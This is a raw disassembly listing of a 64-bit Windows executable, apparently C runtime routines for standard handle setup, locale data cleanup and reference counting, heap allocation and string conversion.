   140008ddc:	8b ce                	mov    %esi,%ecx
   140008dde:	85 f6                	test   %esi,%esi
   140008de0:	74 16                	je     0x140008df8
   140008de2:	83 e9 01             	sub    $0x1,%ecx
   140008de5:	74 0a                	je     0x140008df1
   140008de7:	83 f9 01             	cmp    $0x1,%ecx
   140008dea:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140008def:	eb 0c                	jmp    0x140008dfd
   140008df1:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140008df6:	eb 05                	jmp    0x140008dfd
   140008df8:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140008dfd:	ff 15 0d 63 00 00    	call   *0x630d(%rip)        # 0x14000f110
   140008e03:	48 8b e8             	mov    %rax,%rbp
   140008e06:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140008e0a:	48 83 f9 01          	cmp    $0x1,%rcx
   140008e0e:	76 2d                	jbe    0x140008e3d
   140008e10:	48 8b c8             	mov    %rax,%rcx
   140008e13:	ff 15 a7 63 00 00    	call   *0x63a7(%rip)        # 0x14000f1c0
   140008e19:	85 c0                	test   %eax,%eax
   140008e1b:	74 20                	je     0x140008e3d
   140008e1d:	0f b6 c0             	movzbl %al,%eax
   140008e20:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   140008e25:	83 f8 02             	cmp    $0x2,%eax
   140008e28:	75 07                	jne    0x140008e31
   140008e2a:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140008e2f:	eb 31                	jmp    0x140008e62
   140008e31:	83 f8 03             	cmp    $0x3,%eax
   140008e34:	75 2c                	jne    0x140008e62
   140008e36:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   140008e3b:	eb 25                	jmp    0x140008e62
   140008e3d:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140008e42:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   140008e49:	ff ff 
   140008e4b:	48 8b 05 6e 19 01 00 	mov    0x1196e(%rip),%rax        # 0x14001a7c0
   140008e52:	48 85 c0             	test   %rax,%rax
   140008e55:	74 0b                	je     0x140008e62
   140008e57:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   140008e5b:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   140008e62:	ff c6                	inc    %esi
   140008e64:	49 83 c6 08          	add    $0x8,%r14
   140008e68:	83 fe 03             	cmp    $0x3,%esi
   140008e6b:	0f 85 31 ff ff ff    	jne    0x140008da2
   140008e71:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008e76:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008e7b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008e80:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140008e85:	48 83 c4 20          	add    $0x20,%rsp
   140008e89:	41 5e                	pop    %r14
   140008e8b:	c3                   	ret
   140008e8c:	40 53                	rex push %rbx
   140008e8e:	48 83 ec 20          	sub    $0x20,%rsp
   140008e92:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008e97:	e8 0c fa ff ff       	call   0x1400088a8
   140008e9c:	33 db                	xor    %ebx,%ebx
   140008e9e:	33 c9                	xor    %ecx,%ecx
   140008ea0:	e8 a7 fb ff ff       	call   0x140008a4c
   140008ea5:	85 c0                	test   %eax,%eax
   140008ea7:	75 0c                	jne    0x140008eb5
   140008ea9:	e8 e6 fd ff ff       	call   0x140008c94
   140008eae:	e8 d1 fe ff ff       	call   0x140008d84
   140008eb3:	b3 01                	mov    $0x1,%bl
   140008eb5:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008eba:	e8 3d fa ff ff       	call   0x1400088fc
   140008ebf:	8a c3                	mov    %bl,%al
   140008ec1:	48 83 c4 20          	add    $0x20,%rsp
   140008ec5:	5b                   	pop    %rbx
   140008ec6:	c3                   	ret
   140008ec7:	cc                   	int3
   140008ec8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008ecd:	57                   	push   %rdi
   140008ece:	48 83 ec 20          	sub    $0x20,%rsp
   140008ed2:	33 db                	xor    %ebx,%ebx
   140008ed4:	48 8d 3d 05 13 01 00 	lea    0x11305(%rip),%rdi        # 0x14001a1e0
   140008edb:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   140008edf:	48 85 c9             	test   %rcx,%rcx
   140008ee2:	74 0a                	je     0x140008eee
   140008ee4:	e8 13 fb ff ff       	call   0x1400089fc
   140008ee9:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   140008eee:	48 83 c3 08          	add    $0x8,%rbx
   140008ef2:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   140008ef9:	72 d9                	jb     0x140008ed4
   140008efb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008f00:	b0 01                	mov    $0x1,%al
   140008f02:	48 83 c4 20          	add    $0x20,%rsp
   140008f06:	5f                   	pop    %rdi
   140008f07:	c3                   	ret
   140008f08:	48 85 c9             	test   %rcx,%rcx
   140008f0b:	0f 84 00 01 00 00    	je     0x140009011
   140008f11:	53                   	push   %rbx
   140008f12:	48 83 ec 20          	sub    $0x20,%rsp
   140008f16:	48 8b d9             	mov    %rcx,%rbx
   140008f19:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140008f1d:	48 3b 0d 64 08 01 00 	cmp    0x10864(%rip),%rcx        # 0x140019788
   140008f24:	74 05                	je     0x140008f2b
   140008f26:	e8 c1 e5 ff ff       	call   0x1400074ec
   140008f2b:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140008f2f:	48 3b 0d 5a 08 01 00 	cmp    0x1085a(%rip),%rcx        # 0x140019790
   140008f36:	74 05                	je     0x140008f3d
   140008f38:	e8 af e5 ff ff       	call   0x1400074ec
   140008f3d:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140008f41:	48 3b 0d 50 08 01 00 	cmp    0x10850(%rip),%rcx        # 0x140019798
   140008f48:	74 05                	je     0x140008f4f
   140008f4a:	e8 9d e5 ff ff       	call   0x1400074ec
   140008f4f:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140008f53:	48 3b 0d 46 08 01 00 	cmp    0x10846(%rip),%rcx        # 0x1400197a0
   140008f5a:	74 05                	je     0x140008f61
   140008f5c:	e8 8b e5 ff ff       	call   0x1400074ec
   140008f61:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140008f65:	48 3b 0d 3c 08 01 00 	cmp    0x1083c(%rip),%rcx        # 0x1400197a8
   140008f6c:	74 05                	je     0x140008f73
   140008f6e:	e8 79 e5 ff ff       	call   0x1400074ec
   140008f73:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140008f77:	48 3b 0d 32 08 01 00 	cmp    0x10832(%rip),%rcx        # 0x1400197b0
   140008f7e:	74 05                	je     0x140008f85
   140008f80:	e8 67 e5 ff ff       	call   0x1400074ec
   140008f85:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140008f89:	48 3b 0d 28 08 01 00 	cmp    0x10828(%rip),%rcx        # 0x1400197b8
   140008f90:	74 05                	je     0x140008f97
   140008f92:	e8 55 e5 ff ff       	call   0x1400074ec
   140008f97:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140008f9b:	48 3b 0d 36 08 01 00 	cmp    0x10836(%rip),%rcx        # 0x1400197d8
   140008fa2:	74 05                	je     0x140008fa9
   140008fa4:	e8 43 e5 ff ff       	call   0x1400074ec
   140008fa9:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140008fad:	48 3b 0d 2c 08 01 00 	cmp    0x1082c(%rip),%rcx        # 0x1400197e0
   140008fb4:	74 05                	je     0x140008fbb
   140008fb6:	e8 31 e5 ff ff       	call   0x1400074ec
   140008fbb:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140008fbf:	48 3b 0d 22 08 01 00 	cmp    0x10822(%rip),%rcx        # 0x1400197e8
   140008fc6:	74 05                	je     0x140008fcd
   140008fc8:	e8 1f e5 ff ff       	call   0x1400074ec
   140008fcd:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140008fd4:	48 3b 0d 15 08 01 00 	cmp    0x10815(%rip),%rcx        # 0x1400197f0
   140008fdb:	74 05                	je     0x140008fe2
   140008fdd:	e8 0a e5 ff ff       	call   0x1400074ec
   140008fe2:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140008fe9:	48 3b 0d 08 08 01 00 	cmp    0x10808(%rip),%rcx        # 0x1400197f8
   140008ff0:	74 05                	je     0x140008ff7
   140008ff2:	e8 f5 e4 ff ff       	call   0x1400074ec
   140008ff7:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   140008ffe:	48 3b 0d fb 07 01 00 	cmp    0x107fb(%rip),%rcx        # 0x140019800
   140009005:	74 05                	je     0x14000900c
   140009007:	e8 e0 e4 ff ff       	call   0x1400074ec
   14000900c:	48 83 c4 20          	add    $0x20,%rsp
   140009010:	5b                   	pop    %rbx
   140009011:	c3                   	ret
   140009012:	cc                   	int3
   140009013:	cc                   	int3
   140009014:	48 85 c9             	test   %rcx,%rcx
   140009017:	74 66                	je     0x14000907f
   140009019:	53                   	push   %rbx
   14000901a:	48 83 ec 20          	sub    $0x20,%rsp
   14000901e:	48 8b d9             	mov    %rcx,%rbx
   140009021:	48 8b 09             	mov    (%rcx),%rcx
   140009024:	48 3b 0d 45 07 01 00 	cmp    0x10745(%rip),%rcx        # 0x140019770
   14000902b:	74 05                	je     0x140009032
   14000902d:	e8 ba e4 ff ff       	call   0x1400074ec
   140009032:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140009036:	48 3b 0d 3b 07 01 00 	cmp    0x1073b(%rip),%rcx        # 0x140019778
   14000903d:	74 05                	je     0x140009044
   14000903f:	e8 a8 e4 ff ff       	call   0x1400074ec
   140009044:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140009048:	48 3b 0d 31 07 01 00 	cmp    0x10731(%rip),%rcx        # 0x140019780
   14000904f:	74 05                	je     0x140009056
   140009051:	e8 96 e4 ff ff       	call   0x1400074ec
   140009056:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   14000905a:	48 3b 0d 67 07 01 00 	cmp    0x10767(%rip),%rcx        # 0x1400197c8
   140009061:	74 05                	je     0x140009068
   140009063:	e8 84 e4 ff ff       	call   0x1400074ec
   140009068:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   14000906c:	48 3b 0d 5d 07 01 00 	cmp    0x1075d(%rip),%rcx        # 0x1400197d0
   140009073:	74 05                	je     0x14000907a
   140009075:	e8 72 e4 ff ff       	call   0x1400074ec
   14000907a:	48 83 c4 20          	add    $0x20,%rsp
   14000907e:	5b                   	pop    %rbx
   14000907f:	c3                   	ret
   140009080:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009085:	57                   	push   %rdi
   140009086:	48 83 ec 20          	sub    $0x20,%rsp
   14000908a:	48 8d 3c d1          	lea    (%rcx,%rdx,8),%rdi
   14000908e:	48 8b d9             	mov    %rcx,%rbx
   140009091:	48 3b cf             	cmp    %rdi,%rcx
   140009094:	74 11                	je     0x1400090a7
   140009096:	48 8b 0b             	mov    (%rbx),%rcx
   140009099:	e8 4e e4 ff ff       	call   0x1400074ec
   14000909e:	48 83 c3 08          	add    $0x8,%rbx
   1400090a2:	48 3b df             	cmp    %rdi,%rbx
   1400090a5:	75 ef                	jne    0x140009096
   1400090a7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400090ac:	48 83 c4 20          	add    $0x20,%rsp
   1400090b0:	5f                   	pop    %rdi
   1400090b1:	c3                   	ret
   1400090b2:	cc                   	int3
   1400090b3:	cc                   	int3
   1400090b4:	48 85 c9             	test   %rcx,%rcx
   1400090b7:	0f 84 fe 00 00 00    	je     0x1400091bb
   1400090bd:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400090c2:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400090c7:	56                   	push   %rsi
   1400090c8:	48 83 ec 20          	sub    $0x20,%rsp
   1400090cc:	bd 07 00 00 00       	mov    $0x7,%ebp
   1400090d1:	48 8b d9             	mov    %rcx,%rbx
   1400090d4:	8b d5                	mov    %ebp,%edx
   1400090d6:	e8 a5 ff ff ff       	call   0x140009080
   1400090db:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   1400090df:	8b d5                	mov    %ebp,%edx
   1400090e1:	e8 9a ff ff ff       	call   0x140009080
   1400090e6:	8d 75 05             	lea    0x5(%rbp),%esi
   1400090e9:	8b d6                	mov    %esi,%edx
   1400090eb:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   1400090ef:	e8 8c ff ff ff       	call   0x140009080
   1400090f4:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   1400090fb:	8b d6                	mov    %esi,%edx
   1400090fd:	e8 7e ff ff ff       	call   0x140009080
   140009102:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   140009109:	8d 55 fb             	lea    -0x5(%rbp),%edx
   14000910c:	e8 6f ff ff ff       	call   0x140009080
   140009111:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   140009118:	e8 cf e3 ff ff       	call   0x1400074ec
   14000911d:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   140009124:	e8 c3 e3 ff ff       	call   0x1400074ec
   140009129:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   140009130:	e8 b7 e3 ff ff       	call   0x1400074ec
   140009135:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   14000913c:	8b d5                	mov    %ebp,%edx
   14000913e:	e8 3d ff ff ff       	call   0x140009080
   140009143:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   14000914a:	8b d5                	mov    %ebp,%edx
   14000914c:	e8 2f ff ff ff       	call   0x140009080
   140009151:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   140009158:	8b d6                	mov    %esi,%edx
   14000915a:	e8 21 ff ff ff       	call   0x140009080
   14000915f:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   140009166:	8b d6                	mov    %esi,%edx
   140009168:	e8 13 ff ff ff       	call   0x140009080
   14000916d:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   140009174:	8d 55 fb             	lea    -0x5(%rbp),%edx
   140009177:	e8 04 ff ff ff       	call   0x140009080
   14000917c:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   140009183:	e8 64 e3 ff ff       	call   0x1400074ec
   140009188:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   14000918f:	e8 58 e3 ff ff       	call   0x1400074ec
   140009194:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   14000919b:	e8 4c e3 ff ff       	call   0x1400074ec
   1400091a0:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   1400091a7:	e8 40 e3 ff ff       	call   0x1400074ec
   1400091ac:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400091b1:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400091b6:	48 83 c4 20          	add    $0x20,%rsp
   1400091ba:	5e                   	pop    %rsi
   1400091bb:	c3                   	ret
   1400091bc:	40 53                	rex push %rbx
   1400091be:	48 83 ec 20          	sub    $0x20,%rsp
   1400091c2:	48 8b d9             	mov    %rcx,%rbx
   1400091c5:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   1400091c9:	77 3c                	ja     0x140009207
   1400091cb:	48 85 c9             	test   %rcx,%rcx
   1400091ce:	b8 01 00 00 00       	mov    $0x1,%eax
   1400091d3:	48 0f 44 d8          	cmove  %rax,%rbx
   1400091d7:	eb 15                	jmp    0x1400091ee
   1400091d9:	e8 42 cd ff ff       	call   0x140005f20
   1400091de:	85 c0                	test   %eax,%eax
   1400091e0:	74 25                	je     0x140009207
   1400091e2:	48 8b cb             	mov    %rbx,%rcx
   1400091e5:	e8 1e 0c 00 00       	call   0x140009e08
   1400091ea:	85 c0                	test   %eax,%eax
   1400091ec:	74 19                	je     0x140009207
   1400091ee:	48 8b 0d 93 15 01 00 	mov    0x11593(%rip),%rcx        # 0x14001a788
   1400091f5:	4c 8b c3             	mov    %rbx,%r8
   1400091f8:	33 d2                	xor    %edx,%edx
   1400091fa:	ff 15 00 5e 00 00    	call   *0x5e00(%rip)        # 0x14000f000
   140009200:	48 85 c0             	test   %rax,%rax
   140009203:	74 d4                	je     0x1400091d9
   140009205:	eb 0d                	jmp    0x140009214
   140009207:	e8 48 e2 ff ff       	call   0x140007454
   14000920c:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140009212:	33 c0                	xor    %eax,%eax
   140009214:	48 83 c4 20          	add    $0x20,%rsp
   140009218:	5b                   	pop    %rbx
   140009219:	c3                   	ret
   14000921a:	cc                   	int3
   14000921b:	cc                   	int3
   14000921c:	45 33 c9             	xor    %r9d,%r9d
   14000921f:	66 44 39 09          	cmp    %r9w,(%rcx)
   140009223:	74 28                	je     0x14000924d
   140009225:	4c 8b c2             	mov    %rdx,%r8
   140009228:	66 44 39 0a          	cmp    %r9w,(%rdx)
   14000922c:	74 15                	je     0x140009243
   14000922e:	0f b7 02             	movzwl (%rdx),%eax
   140009231:	66 3b 01             	cmp    (%rcx),%ax
   140009234:	74 13                	je     0x140009249
   140009236:	49 83 c0 02          	add    $0x2,%r8
   14000923a:	41 0f b7 00          	movzwl (%r8),%eax
   14000923e:	66 85 c0             	test   %ax,%ax
   140009241:	75 ee                	jne    0x140009231
   140009243:	48 83 c1 02          	add    $0x2,%rcx
   140009247:	eb d6                	jmp    0x14000921f
   140009249:	48 8b c1             	mov    %rcx,%rax
   14000924c:	c3                   	ret
   14000924d:	33 c0                	xor    %eax,%eax
   14000924f:	c3                   	ret
   140009250:	40 55                	rex push %rbp
   140009252:	41 54                	push   %r12
   140009254:	41 55                	push   %r13
   140009256:	41 56                	push   %r14
   140009258:	41 57                	push   %r15
   14000925a:	48 83 ec 60          	sub    $0x60,%rsp
   14000925e:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140009263:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   140009267:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   14000926b:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   14000926f:	48 8b 05 ca fd 00 00 	mov    0xfdca(%rip),%rax        # 0x140019040
   140009276:	48 33 c5             	xor    %rbp,%rax
   140009279:	48 89 45 20          	mov    %rax,0x20(%rbp)
   14000927d:	44 8b ea             	mov    %edx,%r13d
   140009280:	45 8b f9             	mov    %r9d,%r15d
   140009283:	48 8b d1             	mov    %rcx,%rdx
   140009286:	4d 8b e0             	mov    %r8,%r12
   140009289:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000928d:	e8 26 e8 ff ff       	call   0x140007ab8
   140009292:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   140009298:	85 ff                	test   %edi,%edi
   14000929a:	75 07                	jne    0x1400092a3
   14000929c:	48 8b 45 08          	mov    0x8(%rbp),%rax
   1400092a0:	8b 78 0c             	mov    0xc(%rax),%edi
   1400092a3:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   1400092a9:	45 8b cf             	mov    %r15d,%r9d
   1400092ac:	4d 8b c4             	mov    %r12,%r8
   1400092af:	8b cf                	mov    %edi,%ecx
   1400092b1:	1b d2                	sbb    %edx,%edx
   1400092b3:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400092b8:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400092be:	83 e2 08             	and    $0x8,%edx
   1400092c1:	ff c2                	inc    %edx
   1400092c3:	e8 f0 f3 ff ff       	call   0x1400086b8
   1400092c8:	4c 63 f0             	movslq %eax,%r14
   1400092cb:	85 c0                	test   %eax,%eax
   1400092cd:	75 07                	jne    0x1400092d6
   1400092cf:	33 ff                	xor    %edi,%edi
   1400092d1:	e9 da 00 00 00       	jmp    0x1400093b0
   1400092d6:	49 8b f6             	mov    %r14,%rsi
   1400092d9:	48 03 f6             	add    %rsi,%rsi
   1400092dc:	48 8d 46 10          	lea    0x10(%rsi),%rax
   1400092e0:	48 3b f0             	cmp    %rax,%rsi
   1400092e3:	48 1b c9             	sbb    %rcx,%rcx
   1400092e6:	48 23 c8             	and    %rax,%rcx
   1400092e9:	0f 84 a7 00 00 00    	je     0x140009396
   1400092ef:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   1400092f6:	77 31                	ja     0x140009329
   1400092f8:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   1400092fc:	48 3b c1             	cmp    %rcx,%rax
   1400092ff:	77 0a                	ja     0x14000930b
   140009301:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140009308:	ff ff 0f 
   14000930b:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000930f:	e8 3c 49 00 00       	call   0x14000dc50
   140009314:	48 2b e0             	sub    %rax,%rsp
   140009317:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   14000931c:	48 85 db             	test   %rbx,%rbx
   14000931f:	74 1f                	je     0x140009340
   140009321:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   140009327:	eb 13                	jmp    0x14000933c
   140009329:	e8 8e fe ff ff       	call   0x1400091bc
   14000932e:	48 8b d8             	mov    %rax,%rbx
   140009331:	48 85 c0             	test   %rax,%rax
   140009334:	74 0a                	je     0x140009340
   140009336:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000933c:	48 83 c3 10          	add    $0x10,%rbx
   140009340:	48 8b c3             	mov    %rbx,%rax
   140009343:	48 85 db             	test   %rbx,%rbx
   140009346:	74 50                	je     0x140009398
   140009348:	4c 8b c6             	mov    %rsi,%r8
   14000934b:	33 d2                	xor    %edx,%edx
   14000934d:	48 8b cb             	mov    %rbx,%rcx
   140009350:	e8 9b 4a 00 00       	call   0x14000ddf0
   140009355:	45 8b cf             	mov    %r15d,%r9d
   140009358:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   14000935d:	4d 8b c4             	mov    %r12,%r8
   140009360:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009365:	ba 01 00 00 00       	mov    $0x1,%edx
   14000936a:	8b cf                	mov    %edi,%ecx
   14000936c:	e8 47 f3 ff ff       	call   0x1400086b8
   140009371:	44 8b c0             	mov    %eax,%r8d
   140009374:	48 8b c3             	mov    %rbx,%rax
   140009377:	45 85 c0             	test   %r8d,%r8d
   14000937a:	74 1c                	je     0x140009398
   14000937c:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   140009383:	48 8b d3             	mov    %rbx,%rdx
   140009386:	41 8b cd             	mov    %r13d,%ecx
   140009389:	ff 15 39 5e 00 00    	call   *0x5e39(%rip)        # 0x14000f1c8
   14000938f:	8b f8                	mov    %eax,%edi
   140009391:	48 8b c3             	mov    %rbx,%rax
   140009394:	eb 09                	jmp    0x14000939f
   140009396:	33 c0                	xor    %eax,%eax
   140009398:	33 ff                	xor    %edi,%edi
   14000939a:	48 85 c0             	test   %rax,%rax
   14000939d:	74 11                	je     0x1400093b0
   14000939f:	48 8d 48 f0          	lea    -0x10(%rax),%rcx
   1400093a3:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   1400093a9:	75 05                	jne    0x1400093b0
   1400093ab:	e8 3c e1 ff ff       	call   0x1400074ec
   1400093b0:	80 7d 18 00          	cmpb   $0x0,0x18(%rbp)
   1400093b4:	74 0b                	je     0x1400093c1
   1400093b6:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400093ba:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400093c1:	8b c7                	mov    %edi,%eax
   1400093c3:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   1400093c7:	48 33 cd             	xor    %rbp,%rcx
   1400093ca:	e8 c1 46 00 00       	call   0x14000da90
   1400093cf:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   1400093d3:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   1400093d7:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   1400093db:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   1400093df:	41 5f                	pop    %r15
   1400093e1:	41 5e                	pop    %r14
   1400093e3:	41 5d                	pop    %r13
   1400093e5:	41 5c                	pop    %r12
   1400093e7:	5d                   	pop    %rbp
   1400093e8:	c3                   	ret
   1400093e9:	cc                   	int3
   1400093ea:	cc                   	int3
   1400093eb:	cc                   	int3
   1400093ec:	f0 ff 41 10          	lock incl 0x10(%rcx)
   1400093f0:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   1400093f7:	48 85 c0             	test   %rax,%rax
   1400093fa:	74 03                	je     0x1400093ff
   1400093fc:	f0 ff 00             	lock incl (%rax)
   1400093ff:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   140009406:	48 85 c0             	test   %rax,%rax
   140009409:	74 03                	je     0x14000940e
   14000940b:	f0 ff 00             	lock incl (%rax)
   14000940e:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140009415:	48 85 c0             	test   %rax,%rax
   140009418:	74 03                	je     0x14000941d
   14000941a:	f0 ff 00             	lock incl (%rax)
   14000941d:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140009424:	48 85 c0             	test   %rax,%rax
   140009427:	74 03                	je     0x14000942c
   140009429:	f0 ff 00             	lock incl (%rax)
   14000942c:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140009430:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140009436:	48 8d 15 2b 03 01 00 	lea    0x1032b(%rip),%rdx        # 0x140019768
   14000943d:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140009441:	74 0b                	je     0x14000944e
   140009443:	48 8b 10             	mov    (%rax),%rdx
   140009446:	48 85 d2             	test   %rdx,%rdx
   140009449:	74 03                	je     0x14000944e
   14000944b:	f0 ff 02             	lock incl (%rdx)
   14000944e:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140009453:	74 0c                	je     0x140009461
   140009455:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140009459:	48 85 d2             	test   %rdx,%rdx
   14000945c:	74 03                	je     0x140009461
   14000945e:	f0 ff 02             	lock incl (%rdx)
   140009461:	48 83 c0 20          	add    $0x20,%rax
   140009465:	49 83 e8 01          	sub    $0x1,%r8
   140009469:	75 cb                	jne    0x140009436
   14000946b:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   140009472:	e9 79 01 00 00       	jmp    0x1400095f0
   140009477:	cc                   	int3
   140009478:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000947d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009482:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009487:	57                   	push   %rdi
   140009488:	48 83 ec 20          	sub    $0x20,%rsp
   14000948c:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   140009493:	48 8b d9             	mov    %rcx,%rbx
   140009496:	48 85 c0             	test   %rax,%rax
   140009499:	74 79                	je     0x140009514
   14000949b:	48 8d 0d ce 02 01 00 	lea    0x102ce(%rip),%rcx        # 0x140019770
   1400094a2:	48 3b c1             	cmp    %rcx,%rax
   1400094a5:	74 6d                	je     0x140009514
   1400094a7:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   1400094ae:	48 85 c0             	test   %rax,%rax
   1400094b1:	74 61                	je     0x140009514
   1400094b3:	83 38 00             	cmpl   $0x0,(%rax)
   1400094b6:	75 5c                	jne    0x140009514
   1400094b8:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   1400094bf:	48 85 c9             	test   %rcx,%rcx
   1400094c2:	74 16                	je     0x1400094da
   1400094c4:	83 39 00             	cmpl   $0x0,(%rcx)
   1400094c7:	75 11                	jne    0x1400094da
   1400094c9:	e8 1e e0 ff ff       	call   0x1400074ec
   1400094ce:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   1400094d5:	e8 2e fa ff ff       	call   0x140008f08
   1400094da:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   1400094e1:	48 85 c9             	test   %rcx,%rcx
   1400094e4:	74 16                	je     0x1400094fc
   1400094e6:	83 39 00             	cmpl   $0x0,(%rcx)
   1400094e9:	75 11                	jne    0x1400094fc
   1400094eb:	e8 fc df ff ff       	call   0x1400074ec
   1400094f0:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   1400094f7:	e8 18 fb ff ff       	call   0x140009014
   1400094fc:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   140009503:	e8 e4 df ff ff       	call   0x1400074ec
   140009508:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000950f:	e8 d8 df ff ff       	call   0x1400074ec
   140009514:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   14000951b:	48 85 c0             	test   %rax,%rax
   14000951e:	74 47                	je     0x140009567
   140009520:	83 38 00             	cmpl   $0x0,(%rax)
   140009523:	75 42                	jne    0x140009567
   140009525:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
